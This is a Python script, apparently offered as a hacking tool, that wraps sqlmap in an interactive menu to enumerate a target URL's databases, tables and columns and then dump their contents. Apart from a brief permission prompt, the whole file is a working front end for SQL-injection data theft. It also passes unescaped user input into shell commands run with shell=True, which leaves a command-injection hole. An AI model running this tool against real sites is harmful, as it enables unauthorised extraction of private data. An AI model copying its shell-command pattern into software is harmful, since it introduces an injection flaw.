import subprocess

def green_bold(text):
    return f"\033[1;32m{text}\033[0m"

ascii_art = '''
███████  ██████  ██                ██████   ██████  ██████  ██████  ██      ███████ ██████      
██      ██    ██ ██                ██   ██ ██    ██ ██   ██ ██   ██ ██      ██      ██   ██     
███████ ██    ██ ██      █████     ██   ██ ██    ██ ██████  ██████  ██      █████   ██████      
     ██ ██ ▄▄ ██ ██                ██   ██ ██    ██ ██      ██      ██      ██      ██   ██     
███████  ██████  ███████           ██████   ██████  ██      ██      ███████ ███████ ██   ██     
            ▀▀                                                                                
             
							Made in Bangladesh
							Owner: MD Haisam Hoque
							webpage link: https://haisam10.github.io/freelancer/
							version: 2.1
							Happy Hacking (^-^) 
'''

def run_sqlmap(command):
    print(f"\nRunning: {command}\n")
    try:
        result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
        print(result)
        return result
    except subprocess.CalledProcessError as e:
        print("Error:", e.output)
        return ""

def parse_output(output, marker="[*]"):
    return [line.split(marker)[-1].strip() for line in output.splitlines() if marker in line]

def ask_yes_no(prompt, default="n"):
    resp = input(prompt + f" [{default}/{'y' if default=='n' else 'n'}]: ").strip().lower()
    if resp == "":
        resp = default
    return resp in ("y", "yes")

def main():
    print(green_bold(ascii_art))

    url = input("Enter target URL: ").strip()

    while True:
        db_result = run_sqlmap(f"sqlmap -u '{url}' --batch --dbs")
        databases = parse_output(db_result)

        if not databases:
            print("❌ No databases found.")
        else:
            print("\n✅ Databases found:")
            for db in databases:
                print(f" - {db}")

        print("\nOptions:\n1. Enter database name\n2. Exit")
        db_choice = input("Choice: ").strip()

        if db_choice == '2':
            print("Exiting...")
            break
        elif db_choice == '1':
            db_name = input("Enter database name: ").strip()
        else:
            print("Invalid choice.")
            continue

        while True:
            table_result = run_sqlmap(f"sqlmap -u '{url}' --batch -D '{db_name}' --tables")
            tables = parse_output(table_result)

            if not tables:
                print("❌ No tables found.")
            else:
                print("\n✅ Tables found:")
                for table in tables:
                    print(f" - {table}")

            print("\nOptions:\n1. Enter table name\n2. Back to database")
            table_choice = input("Choice: ").strip()

            if table_choice == '2':
                break
            elif table_choice == '1':
                table_name = input("Enter table name: ").strip()
            else:
                print("Invalid choice.")
                continue

            while True:
                column_result = run_sqlmap(f"sqlmap -u '{url}' --batch -D '{db_name}' -T '{table_name}' --columns")
                columns = parse_output(column_result)

                if not columns:
                    print("❌ No columns found.")
                else:
                    print("\n✅ Columns found:")
                    for col in columns:
                        print(f" - {col}")

                # NEW: Ask whether to dump all columns or select specific columns
                print("\nOptions:\n1. Dump columns (choose specific columns)\n2. Dump ALL columns of this table\n3. Back to tables")
                col_choice = input("Choice: ").strip()

                if col_choice == '3':
                    break
                elif col_choice == '2':
                    # Dump all columns: run sqlmap with --dump without -C
                    confirm = ask_yes_no(f"Are you sure you want to dump ALL columns of table '{table_name}'? (ensure you have permission)", default="n")
                    if not confirm:
                        print("Aborted dumping all columns.")
                        continue
                    run_sqlmap(f"sqlmap -u '{url}' --batch -D '{db_name}' -T '{table_name}' --dump")
                elif col_choice == '1':
                    # Ask whether user wants to select all parsed columns quickly
                    if columns:
                        use_all = ask_yes_no("Do you want to select ALL parsed columns shown above?", default="n")
                        if use_all:
                            # If user wants all, run dump for all (same as option 2)
                            confirm = ask_yes_no(f"Confirm: dump ALL columns of '{table_name}'? (ensure permission)", default="n")
                            if not confirm:
                                print("Aborted dumping all columns.")
                                continue
                            run_sqlmap(f"sqlmap -u '{url}' --batch -D '{db_name}' -T '{table_name}' --dump")
                            continue
                    # Otherwise ask for comma-separated column list
                    column_names = input("Enter column names (comma separated): ").strip()
                    if not column_names:
                        print("No columns entered. Returning to column menu.")
                        continue
                    run_sqlmap(f"sqlmap -u '{url}' --batch -D '{db_name}' -T '{table_name}' -C '{column_names}' --dump")
                else:
                    print("Invalid choice.")
                    continue

if __name__ == "__main__":
    main()
